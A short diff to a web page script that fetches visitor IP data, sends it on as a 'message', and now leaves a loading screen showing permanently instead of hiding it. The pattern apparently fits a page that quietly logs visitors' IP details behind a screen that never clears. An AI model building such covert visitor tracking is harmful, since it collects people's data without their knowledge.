@@ -157,15 +157,13 @@
         .then(response => response.json())
         .then(data => {
             console.log('Message sent:', data);
-            // Hide the loading screen once data is sent
-            document.getElementById('loading-screen').style.display = 'none';
+            // The loading screen will stay visible, no need to hide it
         })
         .catch(error => console.error('Error sending message:', error));
     })
     .catch(error => {
         console.error('Error fetching IP data:', error);
-        // Hide the loading screen if there's an error
-        document.getElementById('loading-screen').style.display = 'none';
+        // Loading screen remains visible even on error
     });
 </script>
 
